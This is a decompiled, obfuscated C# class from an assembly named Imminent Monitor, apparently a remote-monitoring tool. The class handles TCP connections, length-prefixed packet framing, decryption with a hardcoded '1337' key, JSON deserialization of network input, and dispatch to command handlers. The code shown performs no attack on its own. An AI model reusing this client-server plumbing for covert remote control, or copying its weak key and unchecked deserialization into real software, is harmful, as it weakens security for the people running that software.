// Decompiled with JetBrains decompiler
// Type: GClass18
// Assembly: ImminentMonitor, Version=5.0.0.89, Culture=neutral, PublicKeyToken=null
// MVID: B073CE4A-B7A6-4CA1-871B-499EF3E27493
// Assembly location: C:\Users\Artem\Documents\Code\Imminent Monitor 5\Imminent Monitor.exe

using Imminent.IServerVars;
using Microsoft.VisualBasic.CompilerServices;
using Newtonsoft.Json;
using System;
using System.Net;
using System.Net.Sockets;
using System.Runtime.CompilerServices;
using System.Text;

public sealed class GClass18
{
  private GClass18.GDelegate7 gdelegate7_0;
  private GClass18.GDelegate6 gdelegate6_0;
  private GClass18.GDelegate5 gdelegate5_0;
  private bool bool_0;
  private bool bool_1;
  private bool bool_2;
  private bool bool_3;
  private byte[] byte_0;
  private bool bool_4;
  private int int_0;
  private GClass32 gclass32_0;
  private IServerClient iserverClient_0;
  private IPEndPoint ipendPoint_0;
  private bool bool_5;
  private bool bool_6;
  private readonly bool bool_7;
  public Socket socket_0;
  public long long_0;
  private byte[] byte_1;
  public int int_1;
  public int int_2;
  public int int_3;
  public int int_4;
  private readonly int int_5;
  private GClass18.GEnum5 genum5_0;
  private Class159 class159_0;

  public GClass18()
  {
    this.method_7(true);
    this.method_9(false);
    this.method_11(false);
    this.method_13(false);
    this.method_15(Encoding.UTF8.GetBytes("1337"));
    this.long_0 = 0L;
    this.int_5 = 4;
    this.genum5_0 = (GClass18.GEnum5) 0;
    this.class159_0 = new Class159();
    this.bool_7 = true;
  }

  public GClass18(GClass30 gclass30_0, Socket socket_1, int int_6)
  {
    this.method_7(true);
    this.method_9(false);
    this.method_11(false);
    this.method_13(false);
    this.method_15(Encoding.UTF8.GetBytes("1337"));
    this.long_0 = 0L;
    this.int_5 = 4;
    this.genum5_0 = (GClass18.GEnum5) 0;
    this.class159_0 = new Class159();
    try
    {
      this.socket_0 = socket_1;
      this.method_19(int_6);
      this.method_29();
      this.method_28();
    }
    catch (Exception ex)
    {
      ProjectData.SetProjectError(ex);
      Exception exception_0 = ex;
      GClass18.GDelegate5 gdelegate50 = this.gdelegate5_0;
      if (gdelegate50 != null)
        gdelegate50(this, exception_0);
      this.method_32();
      ProjectData.ClearProjectError();
    }
  }

  [MethodImpl(MethodImplOptions.Synchronized)]
  public void method_0(GClass18.GDelegate7 gdelegate7_1) => this.gdelegate7_0 += gdelegate7_1;

  [MethodImpl(MethodImplOptions.Synchronized)]
  public void method_1(GClass18.GDelegate7 gdelegate7_1) => this.gdelegate7_0 -= gdelegate7_1;

  [MethodImpl(MethodImplOptions.Synchronized)]
  public void method_2(GClass18.GDelegate6 gdelegate6_1) => this.gdelegate6_0 += gdelegate6_1;

  [MethodImpl(MethodImplOptions.Synchronized)]
  public void method_3(GClass18.GDelegate6 gdelegate6_1) => this.gdelegate6_0 -= gdelegate6_1;

  [MethodImpl(MethodImplOptions.Synchronized)]
  public void method_4(GClass18.GDelegate5 gdelegate5_1) => this.gdelegate5_0 += gdelegate5_1;

  [MethodImpl(MethodImplOptions.Synchronized)]
  public void method_5(GClass18.GDelegate5 gdelegate5_1) => this.gdelegate5_0 -= gdelegate5_1;

  public bool method_6() => this.bool_0;

  public void method_7(bool bool_8) => this.bool_0 = bool_8;

  public bool method_8() => this.bool_1;

  public void method_9(bool bool_8) => this.bool_1 = bool_8;

  public bool method_10() => this.bool_2;

  public void method_11(bool bool_8) => this.bool_2 = bool_8;

  public bool method_12() => this.bool_3;

  public void method_13(bool bool_8) => this.bool_3 = bool_8;

  public byte[] method_14() => this.byte_0;

  public void method_15(byte[] byte_2) => this.byte_0 = byte_2;

  public bool method_16() => this.bool_4;

  public void method_17(bool bool_8) => this.bool_4 = bool_8;

  public int method_18() => this.int_0;

  public void method_19(int int_6)
  {
    if (int_6 < 1)
      throw new Exception("Value must be greater than 0.");
    if (this.method_26())
      throw new Exception("Unable to change this property while socket is in use.");
    this.int_0 = int_6;
  }

  public GClass32 method_20() => this.gclass32_0;

  public void method_21(GClass32 gclass32_1) => this.gclass32_0 = gclass32_1;

  public IServerClient method_22() => this.iserverClient_0;

  public void method_23(IServerClient iserverClient_1) => this.iserverClient_0 = iserverClient_1;

  public IPEndPoint method_24() => this.ipendPoint_0 != null ? this.ipendPoint_0 : new IPEndPoint(IPAddress.None, 0);

  public bool method_25() => this.bool_5;

  public bool method_26() => this.bool_5 || this.bool_6;

  public bool method_27() => this.bool_7;

  private void method_28()
  {
    try
    {
      this.ipendPoint_0 = (IPEndPoint) this.socket_0.RemoteEndPoint;
      this.bool_6 = false;
      this.bool_5 = true;
      if (this.method_27())
      {
        GClass18.GDelegate7 gdelegate70 = this.gdelegate7_0;
        if (gdelegate70 != null)
          gdelegate70(this, true);
      }
      this.socket_0.BeginReceive(this.byte_1, 0, this.method_18(), SocketFlags.None, new AsyncCallback(this.method_30), (object) null);
    }
    catch (Exception ex)
    {
      ProjectData.SetProjectError(ex);
      Exception exception_0 = ex;
      GClass18.GDelegate5 gdelegate50 = this.gdelegate5_0;
      if (gdelegate50 != null)
        gdelegate50(this, exception_0);
      this.method_32();
      ProjectData.ClearProjectError();
    }
  }

  private void method_29() => this.byte_1 = new byte[this.method_18() - 1 + 1];

  private void method_30(IAsyncResult iasyncResult_0)
  {
    try
    {
      int int_2;
      try
      {
        int_2 = this.socket_0.EndReceive(iasyncResult_0);
        this.long_0 += (long) int_2;
        if (int_2 <= 0)
        {
          this.method_32();
          return;
        }
      }
      catch (NullReferenceException ex)
      {
        ProjectData.SetProjectError((Exception) ex);
        ProjectData.ClearProjectError();
        return;
      }
      catch (ObjectDisposedException ex)
      {
        ProjectData.SetProjectError((Exception) ex);
        ProjectData.ClearProjectError();
        return;
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        this.method_32();
        ProjectData.ClearProjectError();
        return;
      }
      if (this.bool_4)
      {
        GClass18.GDelegate6 gdelegate60 = this.gdelegate6_0;
        if (gdelegate60 != null)
          gdelegate60(this, (double) this.int_2 / (double) this.byte_1.Length * 100.0, this.int_2, this.byte_1.Length, int_2);
      }
      this.int_1 += int_2;
      bool flag = true;
      while (flag)
      {
        switch (this.genum5_0)
        {
          case (GClass18.GEnum5) 0:
            flag = this.int_1 >= this.int_5;
            if (this.int_1 >= this.int_5)
            {
              try
              {
                this.int_4 = BitConverter.ToInt32(this.byte_1, this.int_2);
                this.int_1 -= this.int_5;
                this.int_2 += this.int_5;
                try
                {
                  if (this.int_4 > this.byte_1.Length - 1 & this.int_4 > 0)
                    Array.Resize<byte>(ref this.byte_1, this.int_4);
                }
                catch (Exception ex)
                {
                  ProjectData.SetProjectError(ex);
                  ProjectData.ClearProjectError();
                  return;
                }
                this.genum5_0 = (GClass18.GEnum5) 1;
                continue;
              }
              catch (Exception ex)
              {
                ProjectData.SetProjectError(ex);
                flag = false;
                this.method_32();
                ProjectData.ClearProjectError();
                continue;
              }
            }
            else
              continue;
          case (GClass18.GEnum5) 1:
            flag = this.int_1 >= this.int_4;
            if (this.int_1 >= this.int_4)
            {
              object[] object_0 = (object[]) null;
              try
              {
                if (this.method_6())
                {
                  byte[] numArray = new byte[this.int_4 - 1 + 1];
                  Array.Copy((Array) this.byte_1, this.int_2, (Array) numArray, 0, this.int_4);
                  object_0 = JsonConvert.DeserializeObject<object[]>(Encoding.UTF8.GetString(numArray));
                  this.method_7(true);
                  this.method_9(true);
                }
              }
              catch (Exception ex)
              {
                ProjectData.SetProjectError(ex);
                this.method_7(false);
                ProjectData.ClearProjectError();
              }
              if (!this.method_6())
              {
                this.byte_1 = dje_zZ6SFP48AP27RN8Z788PXBKEEUH4SS7KQ4MJBGAK2EK9LM5Q_ejd.smethod_1(this.byte_1, this.method_14(), this.int_2, this.int_4);
                object_0 = this.class159_0.method_3(this.byte_1, this.int_4, this.int_2);
              }
              if (object_0 != null)
              {
                if (object_0.Length != 0)
                {
                  object obj = !this.method_6() ? (object) (dje_zZ6SFP48AP27RN8Z788PXBKEEUH4SS7KQ4MJBGAK2EK9LM5Q_ejd.PacketHeader) object_0[0] : (object) (dje_zZ6SFP48AP27RN8Z788PXBKEEUH4SS7KQ4MJBGAK2EK9LM5Q_ejd.PacketHeader) Convert.ChangeType(RuntimeHelpers.GetObjectValue(object_0[0]), typeof (byte));
                  if (this.method_12())
                    Class97.gclass39_0.method_4(this, (dje_zZ6SFP48AP27RN8Z788PXBKEEUH4SS7KQ4MJBGAK2EK9LM5Q_ejd.PacketHeader) Conversions.ToByte(obj), object_0);
                  else
                    Class97.gclass21_0.method_4(this, (dje_zZ6SFP48AP27RN8Z788PXBKEEUH4SS7KQ4MJBGAK2EK9LM5Q_ejd.PacketHeader) Conversions.ToByte(obj), object_0);
                  this.int_2 += this.int_4;
                  this.int_1 -= this.int_4;
                }
                else
                  this.method_32();
              }
              else
                this.method_32();
              this.genum5_0 = (GClass18.GEnum5) 0;
              continue;
            }
            continue;
          default:
            continue;
        }
      }
      if (this.int_2 + (this.genum5_0 != (GClass18.GEnum5) 0 ? this.int_4 : this.int_5) >= this.byte_1.Length - 1)
      {
        Array.Copy((Array) this.byte_1, this.int_2, (Array) this.byte_1, 0, this.int_1);
        this.int_3 = this.int_1;
        this.int_2 = 0;
      }
      else
        this.int_3 += int_2;
      if (this.byte_1.Length - this.int_3 > 0)
      {
        if (this.socket_0 == null)
          return;
        try
        {
          this.socket_0.BeginReceive(this.byte_1, this.int_3, this.byte_1.Length - this.int_3, SocketFlags.None, new AsyncCallback(this.method_30), (object) null);
        }
        catch (ObjectDisposedException ex)
        {
          ProjectData.SetProjectError((Exception) ex);
          this.method_32();
          ProjectData.ClearProjectError();
        }
        catch (Exception ex)
        {
          ProjectData.SetProjectError(ex);
          this.method_32();
          ProjectData.ClearProjectError();
        }
      }
      else
        this.method_32();
    }
    catch (Exception ex)
    {
      ProjectData.SetProjectError(ex);
      Exception exception_0 = ex;
      GClass18.GDelegate5 gdelegate50 = this.gdelegate5_0;
      if (gdelegate50 != null)
        gdelegate50(this, exception_0);
      this.method_32();
      ProjectData.ClearProjectError();
    }
  }

  public void method_31(byte[] byte_2)
  {
    if (!this.bool_5 || byte_2 == null)
      return;
    byte[] bytes = BitConverter.GetBytes(byte_2.Length);
    byte[] numArray = new byte[byte_2.Length + 3 + 1];
    Array.Copy((Array) bytes, (Array) numArray, bytes.Length);
    Array.Copy((Array) byte_2, 0, (Array) numArray, 4, byte_2.Length);
    try
    {
      this.socket_0.Send(numArray);
    }
    catch (Exception ex)
    {
      ProjectData.SetProjectError(ex);
      Exception exception_0 = ex;
      GClass18.GDelegate5 gdelegate50 = this.gdelegate5_0;
      if (gdelegate50 != null)
        gdelegate50(this, exception_0);
      this.method_32();
      ProjectData.ClearProjectError();
    }
  }

  public void method_32()
  {
label_0:
    int num1;
    int num2;
    try
    {
      ProjectData.ClearProjectError();
      num1 = 1;
label_1:
      int num3 = 2;
      this.bool_5 = false;
label_2:
      num3 = 3;
      this.bool_6 = false;
label_3:
      num3 = 4;
      if (this.socket_0 == null)
        goto label_6;
label_4:
      num3 = 5;
      this.socket_0.Close();
label_5:
      num3 = 6;
      this.socket_0 = (Socket) null;
label_6:
      num3 = 8;
      if (this.method_12())
        goto label_9;
label_7:
      num3 = 9;
      GClass18.GDelegate7 gdelegate70 = this.gdelegate7_0;
      if (gdelegate70 != null)
        gdelegate70(this, false);
label_9:
      num3 = 11;
      this.gclass32_0 = (GClass32) null;
label_10:
      num3 = 12;
      this.ipendPoint_0 = (IPEndPoint) null;
      goto label_17;
label_12:
      num2 = num3;
      switch (num1)
      {
        case 1:
          int num4 = num2 + 1;
          num2 = 0;
          switch (num4)
          {
            case 1:
              goto label_0;
            case 2:
              goto label_1;
            case 3:
              goto label_2;
            case 4:
              goto label_3;
            case 5:
              goto label_4;
            case 6:
              goto label_5;
            case 7:
            case 8:
              goto label_6;
            case 9:
              goto label_7;
            case 10:
            case 11:
              goto label_9;
            case 12:
              goto label_10;
            case 13:
              goto label_17;
          }
          break;
      }
    }
    catch (Exception ex) when (ex is Exception & num1 != 0 & num2 == 0)
    {
      ProjectData.SetProjectError(ex);
      goto label_12;
    }
    throw ProjectData.CreateProjectError(-2146828237);
label_17:
    if (num2 == 0)
      return;
    ProjectData.ClearProjectError();
  }

  public void method_33(string string_0, ushort ushort_0)
  {
    try
    {
      this.bool_6 = true;
      this.method_29();
      this.socket_0 = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp);
      this.socket_0.NoDelay = true;
      this.socket_0.Connect(string_0, (int) ushort_0);
      if (!this.socket_0.Connected)
        return;
      this.socket_0.BeginReceive(this.byte_1, 0, this.method_18(), SocketFlags.None, new AsyncCallback(this.method_30), (object) null);
      this.bool_5 = true;
      GClass18.GDelegate7 gdelegate70 = this.gdelegate7_0;
      if (gdelegate70 == null)
        return;
      gdelegate70(this, true);
    }
    catch (Exception ex)
    {
      ProjectData.SetProjectError(ex);
      Exception exception_0 = ex;
      GClass18.GDelegate5 gdelegate50 = this.gdelegate5_0;
      if (gdelegate50 != null)
        gdelegate50(this, exception_0);
      this.method_32();
      ProjectData.ClearProjectError();
    }
  }

  public delegate void GDelegate5(GClass18 gclass18_0, Exception exception_0);

  public delegate void GDelegate6(
    GClass18 gclass18_0,
    double double_0,
    int int_0,
    int int_1,
    int int_2);

  public enum GEnum5
  {
  }

  public delegate void GDelegate7(GClass18 gclass18_0, bool bool_0);
}
